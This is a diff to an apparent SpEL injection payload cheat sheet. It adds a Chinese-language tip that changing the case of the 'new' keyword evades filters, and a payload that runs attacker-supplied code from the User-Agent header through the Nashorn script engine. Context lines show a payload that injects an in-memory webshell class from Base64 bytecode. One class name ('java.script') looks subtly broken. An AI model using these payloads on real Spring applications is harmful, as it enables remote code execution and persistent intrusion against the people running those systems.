@@ -1,5 +1,7 @@
 # SPEL
 
+>new关键字大小写可以绕过
+
 ## poc
 
 ```java
@@ -45,6 +47,7 @@ T(org.springframework.cglib.core.ReflectUtils).defineClass('Singleton',T(com.sun
 
 #{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
 
+${''.getClass().forName('java.script.ScriptEngineManager').newInstance().getEngineByName("nashorn").eval(#request.getHeader('User-Agent'))}
 
 echo
 
